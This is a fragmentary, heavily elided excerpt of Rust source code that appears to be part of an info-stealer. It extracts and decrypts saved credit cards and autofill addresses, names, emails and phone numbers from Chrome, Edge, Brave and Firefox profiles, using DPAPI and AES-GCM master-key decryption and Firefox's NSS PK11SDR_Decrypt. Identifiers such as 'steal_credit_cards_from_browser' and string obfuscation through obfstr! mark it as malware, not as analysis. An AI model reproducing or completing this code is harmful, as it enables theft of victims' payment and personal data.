...
use crate::stealer::chromium::{
    decrypt_aes_gcm_bytes_debug, decrypt_value_dpapi, extract_master_key,
};
                ...
                for i in 1..=5 {
                    ...
                    if profile_path.exists() {
                        if let Some(temp_path) = copy_to_temp(&profile_path) {
                            let mut profile_cards = extract_credit_cards(
                                &temp_path,
                                &format!("{} ({})", browser.name, profile_name),
                                None,
                            );
...
fn steal_credit_cards_from_browser(browser: &BrowserConfig) -> Option<Vec<CreditCard>> {
    ...
    let master_key = if browser.name == obfstr!("Chrome")
        || browser.name == obfstr!("Edge")
        || browser.name == obfstr!("Brave")
    {
                ...
                card_result
            {
                ...
                if let Some(decrypted) = decrypted_bytes {
                    ...
                    if let Some(ref mut f) = log {
                        ...
                        let _ =
                            writeln!(f, "         - Formato desconocido (no v10/v11/v20/DPAPI)");
                    }
                }
            } else {
                if let Some(ref mut f) = log {
        ...
        if browser.name == obfstr!("Edge") || browser.name == obfstr!("Chrome") {
            if let Some(local_appdata) = get_appdata_local() {
                ...
                for i in 1..=5 {
                    ...
                    if profile_path.exists() {
                        if let Some(temp_path) = copy_to_temp(&profile_path) {
                            let mut profile_addresses = extract_autofill_addresses(
                                &temp_path,
                                &format!("{} ({})", browser.name, profile_name),
                            );
...
fn get_profile_contact_info(
    ...
    let name_query = format!(
        "SELECT full_name FROM {} WHERE guid = ?",
        obfstr!("autofill_profile_names")
    );
    ...
    let email_query = format!(
        "SELECT email FROM {} WHERE guid = ?",
        obfstr!("autofill_profile_emails")
    );
    ...
    // Obtener teléfono
    let phone_query = format!(
        "SELECT number FROM {} WHERE guid = ?",
        obfstr!("autofill_profile_phones")
    );
    ...
    F: FnMut(&str),
{
    ...
    let row_count: i64 = conn
        .query_row("SELECT COUNT(*) FROM credit_cards_data", [], |row| {
            row.get(0)
        })
        .unwrap_or(0);
    ...
    F: FnMut(&str),
{
    ...
    let firefox_dir = nss_dll
        .parent()
        .ok_or("No se pudo obtener directorio de Firefox")?;
    log(&format!(
    ...
    unsafe {
        ...
        let nss_init: Symbol<unsafe extern "C" fn(*const c_char) -> c_int> = lib
            .get(b"NSS_Init\0")
            .map_err(|e| format!("NSS_Init not found: {}", e))?;

        // PK11SDR_Decrypt desencripta datos
        let pk11_decrypt: Symbol<
            unsafe extern "C" fn(*mut SECItem, *mut SECItem, *mut c_void) -> c_int,
        > = lib
        ...
        if decrypt_result != 0 {
            return Err(format!(
                "PK11SDR_Decrypt failed with code: {}",
                decrypt_result
            ));
        }
